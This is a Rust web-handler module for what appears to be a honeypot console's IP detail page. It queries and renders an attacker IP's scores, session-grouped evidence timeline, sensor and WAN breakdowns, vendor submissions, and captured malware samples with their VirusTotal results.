//! `GET /ip/:ip` - the IP detail page (`internal/design/06-console-observability.md`, "Pages" >
//! "IP detail"). Session-gated: mounted under the `protected` group in `routes::mod`.
//!
//! Six read-only queries, all scoped to the one path-param IP:
//! - the score summary via `core_scoring::read_score` (decayed to now, same as `routes::queue`)
//!   plus `core_scoring::effective_score` for the breadth-adjusted number the blocklist
//!   recommendation gate actually uses;
//! - the evidence timeline: the last 200 `event` rows for this IP, newest first, grouped in Rust
//!   into per-connection session cards (`session_id`) with an "Ungrouped events" tail for rows
//!   that predate session tracking (`internal/design/11-console-forensics.md`, "Detail page:
//!   payload visibility and session grouping");
//! - the per-WAN breakdown: `event` rows GROUP BY `wan_ip` - internal-only attribution the
//!   operator sees here but that never reaches the feed or a vendor report (this design's own
//!   "Per-WAN attribution is internal-only");
//! - the category breakdown, derived from the already-fetched `IpScore.category_breakdown` (no
//!   extra query - it is the same JSON `routes::queue`'s `live_categories` reads, just kept as
//!   weight/confidence values here instead of collapsed to a category list);
//! - the submission history: `vendor_submission` rows for this IP.
//! - malware fetched from this IP's URLs: `fetch_attempt` rows whose `source_ip` is this IP,
//!   LEFT JOINed against `sample_analysis` on the captured payload's sha256, so the "attacker src"
//!   / "download URL" / "VT-scanned sample" that today read as three unrelated things share one
//!   panel (`fetch_malware_rows`'s doc comment covers the type-mismatched join and the
//!   first-reporter-only attribution caveat this carries).
//!
//! An IP with no `ip_score` row renders 404, matching the design's "Error handling": "Missing IP
//! ... returns 404." That is a normal, expected outcome (an operator following a stale link, or
//! guessing an IP), not a database/template failure, so it is handled directly rather than
//! through `AppError` (whose every variant renders a generic 503 - see that module's doc
//! comment): a 404 here says something true and specific, a 503 would not.
//!
//! Chart (sub-project 6, console-charts, task 4): a per-IP event timeline, one more Chart.js chart
//! fed by `Chart` (the global `routes::dashboard`'s templates already load). Its query is
//! supplementary rather than core content - same soft-fail policy `routes::dashboard`'s own doc
//! comment establishes for its charts ("a slow or errored chart query degrades to an empty
//! chart... never a 503"), unlike this module's other four queries, which all hard-fail via `?`:
//! an IP whose score/evidence/WAN/submission data cannot be read is a broken page, but one whose
//! timeline query hiccups is still a perfectly usable detail page minus one chart. `generate_series`
//! zero-fills every bucket unconditionally, so - like the dashboard's own main timeline - the
//! chart always renders, never gated behind an empty-state check. Defaults to a 7-day daily-bucket
//! window (`detail`); `chart_fragment` (console-forensics task 4) serves the same series at an
//! operator-adjustable range ("24h"/"7d"/"30d") as an HTMX fragment the range-selector buttons swap
//! into `#detail-chart-container`, never re-rendering the whole page for a range change.
//!
//! Evidence timeline pagination (console-forensics task 4): `detail` renders only the first
//! `EVIDENCE_PAGE_SIZE` rows; `events_fragment` serves subsequent pages via a `(observed_at, id)`
//! keyset cursor - a plain `OFFSET` would re-scan and re-sort every prior page on each request and
//! silently skip or duplicate rows if new events land between page loads, both avoided by keying on
//! the last row actually rendered. The "Load more" button's response replaces itself (an HTMX
//! out-of-band swap on `#load-more-container`) with either a fresh button carrying the next cursor
//! or nothing, while the new rows themselves land via a normal `beforeend` swap into
//! `#evidence-timeline` - see `templates/events_fragment.html`.

use std::collections::BTreeMap;
use std::net::IpAddr;

use axum::extract::{Path, Query, State};
use axum::http::{HeaderMap, StatusCode};
use axum::response::{Html, IntoResponse, Response};
use axum::routing::get;
use axum::{Extension, Router};
use chrono::{DateTime, NaiveDate, SecondsFormat, Utc};
use core_scoring::{
    Category, Protocol, SignalType, effective_score, persistence_points, read_score,
};
use minijinja::context;
use rust_decimal::Decimal;
use rust_decimal::prelude::ToPrimitive;
use serde::{Deserialize, Serialize};
use sqlx::{PgPool, Row};

use crate::AppState;
use crate::auth::Session;
use crate::routes::context::{BaseContext, base_context};
use crate::routes::error::AppError;
use crate::routes::format::{
    format_activity, format_relative_time, format_sensor_label, format_timestamp, tier_label,
};

pub fn router() -> Router<AppState> {
    Router::new()
        .route("/ip/{ip}", get(detail))
        .route("/ip/{ip}/events", get(events_fragment))
        .route("/ip/{ip}/chart", get(chart_fragment))
}

/// Both `detail`'s initial page load and `events_fragment`'s subsequent pages fetch at most this
/// many rows per query; a page coming back exactly this size is the "there may be more" signal
/// (`fetch_evidence_rows`'s doc comment) - there is no separate `COUNT(*)` query.
const EVIDENCE_PAGE_SIZE: i64 = 200;

/// Row cap for the "Malware fetched from this IP's URLs" panel's `fetch_malware_rows` query -
/// generous relative to how many distinct download URLs a single attacker realistically reports
/// (unlike the evidence timeline, there is no "Load more" for this panel).
const MALWARE_PAGE_SIZE: i64 = 50;

/// One `event` row as rendered in a session card's body (or the "Ungrouped events" table for
/// pre-`session_id` rows). `activity` and `detail` are both pre-formatted display strings; the
/// fields below `session_id` never reach the template (`#[serde(skip)]`) - they exist purely so
/// [`group_into_sessions`] can derive session-level summaries (start time, duration, credential
/// used, command count) without re-parsing `metadata_json` or re-deriving the snake_case signal
/// type from `activity`'s human label.
#[derive(Debug, Serialize)]
struct EventRow {
    id: i64,
    observed_at: String,
    relative_time: String,
    activity: String,
    detail: String,
    /// Pre-formatted `0xNN` badge, set when the command was recovered from a single-byte-XOR
    /// obfuscation; drives a small "de-obfuscated (xor 0xNN)" badge in the timeline. `None` for a
    /// plaintext command (minijinja has no hex filter, so this is formatted here).
    xor_badge: Option<String>,
    protocol: String,
    authenticated: bool,
    wan_ip: String,
    metadata_json: String,
    session_id: Option<String>,
    #[serde(skip)]
    raw_observed_at: DateTime<Utc>,
    #[serde(skip)]
    sensor_raw: String,
    #[serde(skip)]
    signal_type_raw: String,
    #[serde(skip)]
    metadata: serde_json::Value,
}

/// One collapsible session card: every `EventRow` sharing a non-null `session_id`, in
/// chronological (oldest-first) order, plus the summary [`group_into_sessions`] derives from
/// them for the card header.
#[derive(Debug, Serialize)]
struct SessionGroup {
    session_id: String,
    start_time: String,
    start_relative: String,
    duration: String,
    sensor: String,
    protocol: String,
    username: String,
    command_count: usize,
    event_count: usize,
    events: Vec<EventRow>,
    expanded: bool,
    /// The latest `observed_at` in the group, formatted like `start_time`. Not rendered by the
    /// template (there's no "session end" field in the card header - `duration` already conveys
    /// the span) - it exists purely as [`group_into_sessions`]'s sort key, per the design spec's
    /// "Order sessions by most recent first (latest `observed_at` in each group)": sorting on
    /// `start_time` instead would put a still-ongoing long session behind a short session that
    /// started later but both started and ended after it.
    #[serde(skip)]
    end_time: String,
}

#[derive(Debug, Serialize)]
struct WanRow {
    wan_ip: String,
    event_count: i64,
    has_authenticated: bool,
}

#[derive(Debug, Serialize)]
struct CategoryRow {
    category: String,
    weight: String,
    max_confidence: String,
}

#[derive(Debug, Serialize)]
struct SubmissionRow {
    submitted_at: String,
    vendor: String,
    categories: String,
    response_status: String,
    success: bool,
}

/// One row of the "Services probed" panel: this IP's activity against a single sensor, i.e. which
/// of our services it actually touched and whether it ever authenticated there. The honeypot-native
/// counterpart to a Shodan "services" view - what the attacker did to us, not what it exposes.
#[derive(Debug, Serialize)]
struct ServiceRow {
    /// Human label for the sensor, e.g. `VNC (5900)`; falls back to the raw sensor name.
    service: String,
    sensor: String,
    event_count: i64,
    authenticated: bool,
    first_seen: String,
    last_seen: String,
}

/// One `fetch_attempt` row for this IP, LEFT JOINed against `sample_analysis` on the captured
/// payload's sha256 - the "Malware fetched from this IP's URLs" panel
/// (`fetch_malware_rows`'s doc comment covers the join and its first-reporter-only caveat).
/// `sha256`/`sha256_short`/`detected`/`total`/`vt_link`/`analyzed_at` are all `None` for a fetch
/// that never captured a body (a rejected/dead/timed-out attempt), or that captured one but has
/// not been VirusTotal-scanned yet - `status` still renders in both cases, since a failed or
/// pending fetch is evidence too.
#[derive(Debug, Serialize)]
struct MalwareRow {
    /// "uploaded" (the address handed the body to a sensor - a first-party observation) or
    /// "fetched" (the fetcher retrieved a url this address reported - first-reporter only).
    origin: String,
    url: String,
    host: String,
    pinned_ip: Option<String>,
    /// Raw `fetch_attempt.status` value (pending/success/dead/rejected/too_big/timeout/empty -
    /// `review::fetcher::FetchStatus::as_str()`, same vocabulary `routes::samples` displays).
    status: String,
    /// Pre-formatted byte count (`format_bytes`), `None` when no body was captured.
    bytes: Option<String>,
    /// Full lowercase-hex sha256, for the title attribute; `None` when no body was captured.
    sha256: Option<String>,
    /// First 12 hex chars of `sha256`, for the table cell.
    sha256_short: Option<String>,
    detected: Option<i32>,
    total: Option<i32>,
    vt_link: Option<String>,
    analyzed_at: Option<String>,
}

/// An operator-initiated external lookup link. The operator's browser makes the request, never the
/// honeypot, so the box never leaks which addresses it has captured (egress-free enrichment).
#[derive(Debug, Serialize)]
struct ExternalLink {
    name: String,
    url: String,
}

/// Mirrors the JSON shape of `core_scoring::scoring::engine::CategoryStat` (crate-private there -
/// see `queue.rs`'s `live_categories` for the same deserialize-a-local-shape approach applied to
/// just the category keys).
#[derive(Debug, Deserialize)]
struct CategoryStatView {
    weight: Decimal,
    max_confidence: Decimal,
}

async fn detail(
    State(state): State<AppState>,
    Extension(session): Extension<Session>,
    headers: HeaderMap,
    Query(query): Query<DetailQuery>,
    Path(ip): Path<IpAddr>,
) -> Result<Response, AppError> {
    // Drawer mode: the evidence drawer's `hx-get="/ip/{ip}?drawer=1"` request. Rendered only for a
    // genuine HTMX request (the `HX-Request` header) so a person navigating straight to
    // `/ip/{ip}?drawer=1` still gets the full, chrome-wrapped page - the drawer is a JS enhancement
    // over that real page, never a separate destination. `is_drawer` swaps detail.html's parent to
    // the bare `drawer_shell.html`, so the same template renders into the slide-over.
    let is_drawer = query.drawer.is_some() && headers.contains_key("HX-Request");
    let layout = if is_drawer {
        "drawer_shell.html"
    } else {
        "base.html"
    };

    let Some(score) = read_score(&state.db, ip).await? else {
        return Ok((StatusCode::NOT_FOUND, not_found_body(ip)).into_response());
    };

    let effective = effective_score(score.raw_score, score.distinct_wan_count as u32);
    let raw_f64 = score.raw_score.to_f64().unwrap_or(0.0);
    let effective_f64 = effective.to_f64().unwrap_or(0.0);

    let all_events = fetch_evidence_rows(&state.db, ip, None).await?;
    let total_event_count = all_events.len();
    let has_more_events = all_events.len() as i64 == EVIDENCE_PAGE_SIZE;
    let next_cursor = all_events
        .last()
        .map(|e| format_cursor(e.raw_observed_at, e.id));
    let (sessions, ungrouped) = group_into_sessions(all_events, 3);

    let wan_rows = sqlx::query(
        "SELECT host(wan_ip) AS wan_ip, COUNT(*) AS event_count, \
                bool_or(protocol = 'tcp' AND authenticated) AS has_authenticated \
         FROM event WHERE source_ip = $1::inet AND wan_ip IS NOT NULL \
         GROUP BY wan_ip ORDER BY event_count DESC",
    )
    .bind(ip.to_string())
    .fetch_all(&state.db)
    .await?;
    let mut per_wan = Vec::with_capacity(wan_rows.len());
    for row in wan_rows {
        per_wan.push(WanRow {
            wan_ip: row.try_get("wan_ip")?,
            event_count: row.try_get("event_count")?,
            has_authenticated: row
                .try_get::<Option<bool>, _>("has_authenticated")?
                .unwrap_or(false),
        });
    }

    let categories = category_rows(&score.category_breakdown);

    let submission_rows = sqlx::query(
        "SELECT vendor, categories, submitted_at, response_status, success \
         FROM vendor_submission WHERE source_ip = $1::inet ORDER BY submitted_at DESC",
    )
    .bind(ip.to_string())
    .fetch_all(&state.db)
    .await?;
    let mut submissions = Vec::with_capacity(submission_rows.len());
    for row in submission_rows {
        let submitted_at: DateTime<Utc> = row.try_get("submitted_at")?;
        let categories: Vec<String> = row.try_get("categories")?;
        let response_status: Option<i32> = row.try_get("response_status")?;
        submissions.push(SubmissionRow {
            submitted_at: format_timestamp(submitted_at),
            vendor: row.try_get("vendor")?,
            categories: categories.join(", "),
            response_status: response_status
                .map(|s| s.to_string())
                .unwrap_or_else(|| "-".to_string()),
            success: row.try_get("success")?,
        });
    }

    // "Services probed": this IP's activity grouped by sensor - which of our services it touched,
    // how often, whether it ever authenticated, and the window. Unlike the per-WAN query this does
    // not filter on wan_ip, so it is populated even while WAN attribution is unconfigured.
    let service_rows = sqlx::query(
        "SELECT sensor, COUNT(*) AS event_count, bool_or(authenticated) AS any_auth, \
                min(observed_at) AS first_seen, max(observed_at) AS last_seen \
         FROM event WHERE source_ip = $1::inet \
         GROUP BY sensor ORDER BY event_count DESC, sensor ASC",
    )
    .bind(ip.to_string())
    .fetch_all(&state.db)
    .await?;
    let mut services = Vec::with_capacity(service_rows.len());
    for row in service_rows {
        let sensor: String = row.try_get("sensor")?;
        let first: DateTime<Utc> = row.try_get("first_seen")?;
        let last: DateTime<Utc> = row.try_get("last_seen")?;
        services.push(ServiceRow {
            service: service_label(&sensor),
            sensor,
            event_count: row.try_get("event_count")?,
            authenticated: row.try_get::<Option<bool>, _>("any_auth")?.unwrap_or(false),
            first_seen: format_timestamp(first),
            last_seen: format_timestamp(last),
        });
    }

    let malware = fetch_malware_rows(&state.db, ip).await?;

    let external_links = external_lookup_links(ip);

    // Offline geo/ASN enrichment (egress-free). `None` when no GeoLite2 database is configured, so
    // the template renders the "not configured" placeholder; `Some` (possibly with empty fields)
    // once the operator drops the databases into `PROPOLIS_GEOIP_DIR`.
    let geo = state.geoip.lookup(ip);

    // Opt-in forward-confirmed reverse DNS - the one outbound lookup in this page. Run the blocking
    // system-resolver call off the async worker with a short timeout; `None` (disabled, timed out, or
    // join error) hides the row, so a slow resolver degrades the page by one field, never blocks it.
    let rdns = if state.rdns.is_enabled() {
        let resolver = state.rdns.clone();
        let handle = tokio::task::spawn_blocking(move || resolver.lookup(ip));
        tokio::time::timeout(std::time::Duration::from_secs(3), handle)
            .await
            .ok()
            .and_then(Result::ok)
            .flatten()
    } else {
        None
    };

    // Default range: 7 daily buckets, oldest to newest, zero-filled where a day had no events for
    // this IP - always exactly 7 rows (the `generate_series` bound is unconditional), matching
    // the dashboard's own always-populated hourly timeline. Supplementary: soft-fails to an empty
    // chart rather than the whole page, per the module doc comment. `chart_fragment` (below) reuses
    // the same helper for the adjustable-range HTMX endpoint the "24h/7d/30d" buttons hit.
    let (ip_timeline_labels, ip_timeline_data) = detail_daily_series(&state.db, ip, 6).await;
    let current_range = "7d";

    let csrf_token = state
        .sessions
        .generate_csrf(&session.id)
        .unwrap_or_default();
    let BaseContext {
        pending_count,
        uptime,
        version,
    } = base_context(&state.db, state.startup_time, state.version).await;

    // Shadowed into their JSON-string form right before the template needs them - see
    // `routes::dashboard`'s doc comment for why a string (rendered with `|safe`) rather than a
    // native minijinja list: minijinja auto-escapes every `.html` template, so an un-`|safe`'d
    // JSON string's own quotes would be HTML-entity-escaped into a JS syntax error.
    let ip_timeline_labels =
        serde_json::to_string(&ip_timeline_labels).unwrap_or_else(|_| "[]".into());
    let ip_timeline_data = serde_json::to_string(&ip_timeline_data).unwrap_or_else(|_| "[]".into());

    let tmpl = state.templates.get_template("detail.html")?;
    let html = tmpl.render(context! {
        layout,
        is_drawer,
        csrf_token,
        active_nav => "detail",
        pending_count,
        uptime,
        version,
        ip => ip.to_string(),
        raw_score => format!("{:.1}", score.raw_score),
        raw_score_pct => raw_f64.clamp(0.0, 100.0).round() as u32,
        effective_score => format!("{:.1}", effective),
        effective_score_pct => effective_f64.clamp(0.0, 100.0).round() as u32,
        tier => score.tier.map(tier_label).unwrap_or("-"),
        eligible => score.eligible,
        recommended_for_vendor => score.recommended_for_vendor,
        recommended_for_blocklist => score.recommended_for_blocklist,
        has_confirmed_real => score.has_confirmed_real,
        event_count => score.event_count,
        distinct_categories => score.distinct_categories,
        distinct_wan_count => score.distinct_wan_count,
        distinct_sensor_count => score.distinct_sensor_count,
        // Persistence: distinct active days and the score-point bonus they earn. Shown so a tier
        // driven by persistence (raw below the tier floor, but many active days) is legible rather
        // than looking like a contradiction.
        active_days => score.active_days,
        persistence_bonus => format!("{:.0}", persistence_points(score.active_days as i64)),
        max_confidence => format!("{:.3}", score.max_confidence),
        first_seen => format_timestamp(score.first_seen),
        last_seen => format_timestamp(score.last_seen),
        sessions,
        ungrouped,
        total_event_count,
        has_more_events,
        next_cursor,
        per_wan,
        categories,
        submissions,
        services,
        malware,
        external_links,
        geo,
        rdns,
        ip_timeline_labels,
        ip_timeline_data,
        current_range,
    })?;
    Ok(Html(html).into_response())
}

/// `GET /ip/{ip}/events?cursor=<observed_at>,<id>` - the "Load more" HTMX endpoint for the
/// evidence timeline (module doc comment). `cursor` is `None` on a malformed or unparsable value
/// (fails closed: a bad cursor returns an empty fragment rather than guessing a start point that
/// could duplicate or skip rows already on the page) as well as when the parameter is entirely
/// absent, which real "Load more" clicks never send - the button's own `next_cursor` always comes
/// from `format_cursor` - but a defensive default all the same.
async fn events_fragment(
    State(state): State<AppState>,
    Path(ip): Path<IpAddr>,
    Query(params): Query<EventsCursorQuery>,
) -> Result<Html<String>, AppError> {
    let cursor = match params.cursor.as_deref() {
        None => None,
        Some(raw) => match parse_cursor(raw) {
            Some(c) => Some(c),
            None => {
                tracing::warn!(%ip, cursor = raw, "malformed events pagination cursor; returning empty fragment");
                return Ok(Html(String::new()));
            }
        },
    };

    let events = fetch_evidence_rows(&state.db, ip, cursor).await?;
    let has_more_events = events.len() as i64 == EVIDENCE_PAGE_SIZE;
    let next_cursor = events
        .last()
        .map(|e| format_cursor(e.raw_observed_at, e.id));
    // No auto-expanded card on a "Load more" page - `recent_expanded: 0` - unlike the initial
    // page load's newest-first cards, these are all strictly older than what is already on
    // screen, so none of them is "the current activity" an operator lands on an open view of.
    let (sessions, ungrouped) = group_into_sessions(events, 0);

    let tmpl = state.templates.get_template("events_fragment.html")?;
    let html = tmpl.render(context! {
        ip => ip.to_string(),
        sessions,
        ungrouped,
        has_more_events,
        next_cursor,
    })?;
    Ok(Html(html))
}

/// `GET /ip/{ip}/chart?range=<24h|7d|30d>` - the range-selector HTMX endpoint for the per-IP
/// activity chart (module doc comment). Renders the same fragment template `detail`'s initial page
/// load includes, so the two never drift into two different chart markups.
async fn chart_fragment(
    State(state): State<AppState>,
    Path(ip): Path<IpAddr>,
    Query(params): Query<ChartRangeQuery>,
) -> Result<Html<String>, AppError> {
    let current_range = normalize_detail_range(params.range.as_deref());
    let (labels, data) = detail_chart_series(&state.db, ip, current_range).await;
    let ip_timeline_labels = serde_json::to_string(&labels).unwrap_or_else(|_| "[]".into());
    let ip_timeline_data = serde_json::to_string(&data).unwrap_or_else(|_| "[]".into());

    let tmpl = state.templates.get_template("detail_chart_fragment.html")?;
    let html = tmpl.render(context! {
        current_range,
        ip_timeline_labels,
        ip_timeline_data,
        // Both needed by the out-of-band range-selector swap: `ip` builds each button's
        // hx-get URL, `is_fragment` gates the block off on the full-page render.
        ip => ip.to_string(),
        is_fragment => true,
    })?;
    Ok(Html(html))
}

#[derive(Debug, Deserialize)]
struct EventsCursorQuery {
    #[serde(default)]
    cursor: Option<String>,
}

/// The one query param `detail` reads: `?drawer=1` marks the evidence-drawer HTMX request (see
/// `detail`). Any presence of the param counts; its value is unused.
#[derive(Debug, Deserialize)]
struct DetailQuery {
    #[serde(default)]
    drawer: Option<String>,
}

#[derive(Debug, Deserialize)]
struct ChartRangeQuery {
    #[serde(default)]
    range: Option<String>,
}

/// Normalizes the `?range=` query param to one of the three range-selector buttons
/// (`templates/detail.html`'s `chart-range` selector); anything else - missing, malformed, or a
/// value from a future/removed button - falls back to the same "7d" default `detail`'s own initial
/// render uses, rather than erroring on an operator-editable query string.
fn normalize_detail_range(raw: Option<&str>) -> &'static str {
    match raw {
        Some("24h") => "24h",
        Some("30d") => "30d",
        _ => "7d",
    }
}

async fn detail_chart_series(db: &PgPool, ip: IpAddr, range: &str) -> (Vec<String>, Vec<i64>) {
    match range {
        "24h" => detail_hourly_series(db, ip).await,
        "30d" => detail_daily_series(db, ip, 29).await,
        _ => detail_daily_series(db, ip, 6).await,
    }
}

/// `days + 1` daily buckets (oldest to newest, zero-filled) for this IP's activity chart - shared
/// by `detail`'s default 7-day render (`days: 6`) and `chart_fragment`'s "7d"/"30d" buttons.
/// Soft-fails to two empty vectors on a query error, per the module doc comment's chart policy.
async fn detail_daily_series(db: &PgPool, ip: IpAddr, days: i32) -> (Vec<String>, Vec<i64>) {
    let rows = sqlx::query(
        "SELECT bucket::date AS bucket, COALESCE(cnt, 0) AS cnt \
         FROM generate_series(current_date - ($2::int * interval '1 day'), current_date, interval '1 day') AS bucket \
         LEFT JOIN ( \
             SELECT date_trunc('day', observed_at)::date AS day, COUNT(*) AS cnt \
             FROM event \
             WHERE source_ip = $1::inet AND observed_at >= current_date - ($2::int * interval '1 day') \
             GROUP BY day \
         ) sub ON sub.day = bucket::date \
         ORDER BY bucket",
    )
    .bind(ip.to_string())
    .bind(days)
    .fetch_all(db)
    .await
    .unwrap_or_default();
    let mut labels = Vec::with_capacity(rows.len());
    let mut data = Vec::with_capacity(rows.len());
    for row in rows {
        let (Ok(bucket), Ok(cnt)) = (
            row.try_get::<NaiveDate, _>("bucket"),
            row.try_get::<i64, _>("cnt"),
        ) else {
            continue;
        };
        labels.push(bucket.format("%b %-d").to_string());
        data.push(cnt);
    }
    (labels, data)
}

/// 24 hourly buckets (oldest to newest, zero-filled) for this IP's activity chart -
/// `chart_fragment`'s "24h" button, mirroring `routes::dashboard`'s own site-wide hourly timeline
/// query but scoped to one IP.
async fn detail_hourly_series(db: &PgPool, ip: IpAddr) -> (Vec<String>, Vec<i64>) {
    let rows = sqlx::query(
        "SELECT bucket, COALESCE(cnt, 0) AS cnt \
         FROM generate_series( \
             date_trunc('hour', now()) - interval '23 hours', \
             date_trunc('hour', now()), \
             interval '1 hour' \
         ) AS bucket \
         LEFT JOIN ( \
             SELECT date_trunc('hour', observed_at) AS hour, COUNT(*) AS cnt \
             FROM event WHERE source_ip = $1::inet AND observed_at >= now() - interval '24 hours' \
             GROUP BY hour \
         ) sub ON sub.hour = bucket \
         ORDER BY bucket",
    )
    .bind(ip.to_string())
    .fetch_all(db)
    .await
    .unwrap_or_default();
    let mut labels = Vec::with_capacity(rows.len());
    let mut data = Vec::with_capacity(rows.len());
    for row in rows {
        let (Ok(bucket), Ok(cnt)) = (
            row.try_get::<DateTime<Utc>, _>("bucket"),
            row.try_get::<i64, _>("cnt"),
        ) else {
            continue;
        };
        labels.push(bucket.format("%H:00").to_string());
        data.push(cnt);
    }
    (labels, data)
}

/// Fetches up to [`EVIDENCE_PAGE_SIZE`] `event` rows for `ip`, newest first, optionally starting
/// strictly after a `(observed_at, id)` keyset cursor (`detail`'s doc comment explains why keyset
/// rather than `OFFSET`). Both `detail`'s first page and `events_fragment`'s subsequent ones call
/// this - one query shape, one row-decoding path, so a future column addition only has to change
/// one place. The `id` tiebreak in `ORDER BY` (added by console-forensics task 4; task 3's original
/// query sorted on `observed_at` alone) is load-bearing for pagination correctness: several events
/// can share the same `observed_at` value, and without a deterministic secondary sort a page
/// boundary drawn between two same-timestamp rows could re-serve or skip one on the next page.
async fn fetch_evidence_rows(
    db: &PgPool,
    ip: IpAddr,
    cursor: Option<(DateTime<Utc>, i64)>,
) -> Result<Vec<EventRow>, AppError> {
    let rows =
        match cursor {
            Some((cursor_time, cursor_id)) => sqlx::query(
                "SELECT id, host(wan_ip) AS wan_ip, sensor, signal_type, protocol, authenticated, \
                        observed_at, metadata, session_id::text AS session_id \
                 FROM event WHERE source_ip = $1::inet AND (observed_at, id) < ($2, $3) \
                 ORDER BY observed_at DESC, id DESC LIMIT $4",
            )
            .bind(ip.to_string())
            .bind(cursor_time)
            .bind(cursor_id)
            .bind(EVIDENCE_PAGE_SIZE)
            .fetch_all(db)
            .await?,
            None => sqlx::query(
                "SELECT id, host(wan_ip) AS wan_ip, sensor, signal_type, protocol, authenticated, \
                        observed_at, metadata, session_id::text AS session_id \
                 FROM event WHERE source_ip = $1::inet \
                 ORDER BY observed_at DESC, id DESC LIMIT $2",
            )
            .bind(ip.to_string())
            .bind(EVIDENCE_PAGE_SIZE)
            .fetch_all(db)
            .await?,
        };

    let mut events = Vec::with_capacity(rows.len());
    for row in rows {
        let sensor: String = row.try_get("sensor")?;
        let signal_type: SignalType = row.try_get("signal_type")?;
        let protocol: Protocol = row.try_get("protocol")?;
        let observed_at: DateTime<Utc> = row.try_get("observed_at")?;
        let metadata: serde_json::Value = row.try_get("metadata")?;
        let signal_snake = signal_type_snake(signal_type);
        let metadata_json =
            serde_json::to_string_pretty(&metadata).unwrap_or_else(|_| "{}".to_string());
        events.push(EventRow {
            id: row.try_get("id")?,
            observed_at: format_timestamp(observed_at),
            relative_time: format_relative_time(observed_at),
            activity: format_activity(&sensor, &signal_snake),
            detail: extract_detail(&signal_snake, &metadata),
            xor_badge: metadata
                .get("xor_key")
                .and_then(|v| v.as_u64())
                .map(|k| format!("0x{k:02x}")),
            protocol: format!("{protocol:?}"),
            authenticated: row.try_get("authenticated")?,
            wan_ip: row
                .try_get::<Option<String>, _>("wan_ip")?
                .unwrap_or_else(|| "-".to_string()),
            metadata_json,
            session_id: row.try_get("session_id")?,
            raw_observed_at: observed_at,
            sensor_raw: sensor,
            signal_type_raw: signal_snake,
            metadata,
        });
    }
    Ok(events)
}

/// Fetches up to [`MALWARE_PAGE_SIZE`] `fetch_attempt` rows whose `source_ip` is this IP, newest
/// first by `last_attempt`, LEFT JOINed against `sample_analysis` on the captured payload's
/// sha256 - the link that ties the attacker IP, the download URL it fed a fetcher, and the
/// VirusTotal verdict on what actually came back, today shown as three unrelated things.
///
/// TYPE MISMATCH: `fetch_attempt.sha256` is `BYTEA` (the raw digest, NULL unless a body was
/// captured - `crates/review/migrations/0003_fetch_attempt.sql`); `sample_analysis.sha256` is
/// lowercase-hex `TEXT` (`crates/core-scoring/migrations/0009_sample_analysis.sql`). The join
/// goes through `encode(fa.sha256, 'hex')`, confirmed against a live database
/// (`encode(bytea,'hex')` always lowercases) and against both write paths: `fetch_attempt.sha256`
/// is written from `Sha256::digest(...)` raw bytes and its spool filename from
/// `review::fetcher::to_hex`'s `{b:02x}` formatting (`crates/review/src/fetcher/mod.rs`), and
/// `sample_analysis.sha256` (`review::virustotal`) is keyed directly off that same lowercase-hex
/// spool filename - so both sides are lowercase hex of the same digest by construction, never
/// merely by convention.
///
/// LEFT JOIN, not INNER: a fetch that never captured a body (rejected/dead/timeout/too_big/
/// empty/pending) or one that captured a body VirusTotal has not scanned yet still has a
/// `fetch_attempt` row worth showing, with `detected`/`total`/`vt_link`/`analyzed_at` all `None` -
/// a failed or unscanned fetch is evidence too, not something to hide behind an INNER JOIN's
/// silent drop.
///
/// ATTRIBUTION CAVEAT (do not remove without re-reading the migration and
/// `crates/review/src/fetcher/store.rs`'s upsert): `fetch_attempt`'s primary key is `url_hash`
/// alone, inserted `ON CONFLICT (url_hash) DO NOTHING`, so `source_ip` records only the FIRST
/// attacker whose event queued a given URL for fetching. A later IP that references the exact
/// same URL is never linked here - this panel is "malware fetched from URLs this IP was the
/// first to report", not "every malicious URL this IP has ever referenced". The template carries
/// the same caveat visibly, so the UI never overstates the attribution.
async fn fetch_malware_rows(db: &PgPool, ip: IpAddr) -> Result<Vec<MalwareRow>, AppError> {
    // Two ways a sample is attributable to an address, unioned so the panel shows both:
    //
    // 1. UPLOADED - the address handed the body to a sensor (FTP STOR, SSH/SCP, ADB push). The
    //    event itself carries the sha, so this is a first-party observation, the strongest link
    //    there is. It was missing until an FTP attacker uploaded three samples and the panel still
    //    read "not linked" - the sensor had the evidence, the panel just never asked for it.
    // 2. FETCHED - the fetcher retrieved a URL this address reported. Weaker: it is the FIRST
    //    reporter of that url, not necessarily every one that referenced it.
    //
    // `origin` distinguishes them in the UI so an operator is never shown an inference where a
    // direct observation exists, or the reverse.
    let rows = sqlx::query(
        "SELECT 'uploaded' AS origin, \
                coalesce(e.metadata->>'sample_orig_name', '') AS url, \
                e.sensor AS host, \
                NULL::text AS pinned_ip, \
                'captured' AS status, \
                (e.metadata->>'sample_size')::int AS bytes, \
                e.metadata->>'sample_sha256' AS sha256_hex, \
                sa.detected, sa.total, sa.vt_link, sa.analyzed_at, \
                max(e.observed_at) OVER (PARTITION BY e.metadata->>'sample_sha256') AS sort_at \
         FROM event e \
         LEFT JOIN sample_analysis sa ON e.metadata->>'sample_sha256' = sa.sha256 \
         WHERE e.source_ip = $1::inet AND e.metadata->>'sample_sha256' IS NOT NULL \
         UNION ALL \
         SELECT 'fetched' AS origin, fa.url, fa.host, fa.pinned_ip, fa.status, fa.bytes, \
                encode(fa.sha256, 'hex') AS sha256_hex, \
                sa.detected, sa.total, sa.vt_link, sa.analyzed_at, \
                fa.last_attempt AS sort_at \
         FROM fetch_attempt fa \
         LEFT JOIN sample_analysis sa ON encode(fa.sha256, 'hex') = sa.sha256 \
         WHERE fa.source_ip = $1::inet \
         ORDER BY sort_at DESC LIMIT $2",
    )
    .bind(ip.to_string())
    .bind(MALWARE_PAGE_SIZE)
    .fetch_all(db)
    .await?;

    let mut malware = Vec::with_capacity(rows.len());
    for row in rows {
        let sha256_hex: Option<String> = row.try_get("sha256_hex")?;
        let bytes: Option<i32> = row.try_get("bytes")?;
        let analyzed_at: Option<DateTime<Utc>> = row.try_get("analyzed_at")?;
        malware.push(MalwareRow {
            origin: row.try_get("origin")?,
            url: row.try_get("url")?,
            host: row.try_get("host")?,
            pinned_ip: row.try_get("pinned_ip")?,
            status: row.try_get("status")?,
            bytes: bytes.map(|b| format_bytes(b.max(0) as u64)),
            sha256_short: sha256_hex
                .as_ref()
                .map(|s| s[..s.len().min(12)].to_string()),
            sha256: sha256_hex,
            detected: row.try_get("detected")?,
            total: row.try_get("total")?,
            vt_link: row.try_get("vt_link")?,
            analyzed_at: analyzed_at.map(format_timestamp),
        });
    }
    Ok(malware)
}

/// Parses a `?cursor=<observed_at>,<id>` value (`format_cursor`'s own output - see that function's
/// doc comment for why the timestamp half is always `Z`-suffixed) back into the pair
/// `fetch_evidence_rows` binds into its `(observed_at, id) < (...)` predicate. `None` on any
/// malformed input; `events_fragment` fails closed on that rather than guessing a start point.
